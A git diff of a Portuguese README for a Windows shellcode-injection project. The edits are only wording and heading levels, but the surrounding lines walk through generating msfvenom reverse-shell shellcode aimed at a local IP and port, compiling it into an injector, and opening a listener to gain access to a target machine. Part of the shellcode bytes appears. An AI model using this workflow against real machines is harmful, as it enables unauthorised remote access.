@@ -11,13 +11,13 @@ https://github.com/d0x75/Injector-LocalProcess.git
 
 **Windows CreateRemoteThread Shellcode Injection and Execution in Local Process**
 
->Esse é o clássico Shellcode Injection que fazemos no módulo/processo local do próprio binário compilado com os 
-bytes do shellcode. 
+>Esse é a clássica Injeção de Shellcode que fazemos no
+módulo/processo local do próprio binário que será compilado com os bytes de shellcode que será injetado. 
 
->Quando o shellcode for executado com sucesso, ganhamos acesso na máquina alvo; conforme faremos nos passos a seguir:
+>Quando o shellcode for executado com sucesso, ganhamos acesso na máquina alvo; conforme faremos nos passos a diante:
 
 
-### Step 1 
+#### Step 1 
 
 - Gerar os bytes do shellcode para Windows x86, apontando para o IP do computador que vai ganhar o acesso.
 
@@ -65,7 +65,7 @@ LHOST=192.168.10.113 LPORT=1234 -f c -b \x00\x0a\x0d
 		"\x76\x14\x23";
 ```
 
-### Step 2
+#### Step 2
 
 - Abrir o código do link mencionado no inicio, que tem o
 código responsável por executar os bytes gerados acima.
@@ -85,7 +85,7 @@ _unsigned char shellcode[] = ""_ do código fonte , e depois compilar-lo.
 injectlocal.exe
 ```
 
-### Step 3
+#### Step 3
 
 
 - Abrir a porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador que tem o IP que também colocamos como argumento no msfvenom para gerar o shellcode 
